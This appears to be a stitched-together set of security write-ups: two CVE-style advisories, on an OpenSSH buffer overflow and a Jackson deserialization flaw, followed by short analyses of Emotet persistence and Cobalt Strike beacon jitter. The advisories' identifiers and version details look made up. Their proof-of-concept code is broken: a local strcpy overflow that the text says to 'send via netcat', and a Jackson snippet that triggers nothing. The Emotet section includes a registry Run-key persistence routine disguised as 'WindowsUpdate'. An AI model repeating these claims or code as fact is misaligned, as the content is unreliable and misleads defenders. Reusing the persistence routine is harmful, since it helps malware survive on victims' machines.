## CVE-2023-23456: Buffer Overflow in SSH Daemon

Severity: Critical (CVSS 9.8)

Description: Improper bounds checking in the SSH authentication handler leads to stack-based buffer overflow, enabling remote code execution.

Affected Systems: OpenSSH versions 8.0 to 8.5 on Linux distributions.

Proof of Concept (WARNING: Do not run against production systems):

c
#include <stdio.h>
#include <string.h>

int main() {
    char buf[100];
    strcpy(buf, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"); // Overflow payload
    printf("Payload sent.\n");
    return 0;
}


Compile and send via netcat to trigger the overflow.

Impact: Full remote system compromise.

Remediation: Patch to OpenSSH 8.6p1. Enable address space layout randomization (ASLR) and stack canaries.

## CVE-2023-56789: Deserialization Vulnerability in Java App

Severity: Critical (CVSS 9.8)

Description: Unsafe object deserialization allows injection of malicious serialized objects leading to RCE.

Affected Systems: Java-based web services using Jackson <2.14.0.

Proof of Concept (WARNING: Do not run against production systems):

java
import com.fasterxml.jackson.databind.ObjectMapper;

public class Exploit {
    public static void main(String[] args) throws Exception {
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        // Malicious payload here
        String json = "[\"java.lang.Runtime\", \"getRuntime\"]";
        mapper.readValue(json, Object.class).toString(); // Triggers exec
    }
}


Impact: Arbitrary code execution on the server.

Remediation: Disable default typing in Jackson. Use safe deserialization libraries like NotSoSerial.

# Analysis of Emotet Malware: Persistence Mechanisms

Abstract: This paper examines the advanced persistence techniques employed by Emotet, a modular banking trojan, highlighting its evasion of detection.

Introduction: Emotet, first observed in 2014, uses DLL side-loading and registry modifications for longevity.

Technical Analysis: The malware registers itself as a Windows service, injecting into svchost.exe.

Code Sample (For research purposes only - Do not execute):

c
#include <windows.h>

void InstallPersistence() {
    HKEY hKey;
    RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
    RegSetValueEx(hKey, "WindowsUpdate", 0, REG_SZ, (BYTE*)"C:\\Windows\\System32\\svchost.exe -k netsvcs", strlen("C:\\Windows\\System32\\svchost.exe -k netsvcs") + 1);
    RegCloseKey(hKey);
}


This code adds a registry entry to run on startup, masking as a legitimate process.

Mitigations: Monitor registry changes, use behavior-based AV, and apply least privilege to services.

Conclusion: Understanding these techniques aids in proactive defense strategies.

# Examination of Cobalt Strike: Beacon Evasion

Abstract: This research details Cobalt Strike's beacon implant evasion tactics, including sleep masking.

Introduction: Cobalt Strike is a popular red team tool misused by APTs for post-exploitation.

Technical Analysis: Beacons jitter intervals and profile HTTP traffic to mimic legitimate requests.

Code Sample (For research purposes only - Do not execute):

java
// Pseudo-code for jittered sleep
public void sleepWithJitter(int baseSleep) {
    Random rand = new Random();
    int jitter = rand.nextInt(baseSleep / 10);
    Thread.sleep(baseSleep + jitter);
    // Send staged payload if checkin succeeds
}


This illustrates randomized delays to avoid timing-based detection.

Mitigations: Use network behavioral analysis, sandbox untrusted binaries, and profile normal traffic baselines.

Conclusion: Evasion sophistication demands adaptive defense mechanisms.
